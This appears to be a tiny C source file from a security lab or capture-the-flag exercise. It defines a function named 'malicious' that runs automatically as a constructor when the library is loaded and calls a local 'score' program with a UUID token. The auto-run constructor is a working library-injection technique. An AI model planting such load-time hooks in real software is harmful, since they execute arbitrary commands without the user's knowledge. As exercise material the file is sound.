	#include<stdio.h>
	#include<stdlib.h>
	 
	static void malicious() __attribute__((constructor));
	 
	void malicious() {
	  system("/usr/local/bin/score db7cb369-22b5-4238-86da-657e499f5e46");
	}
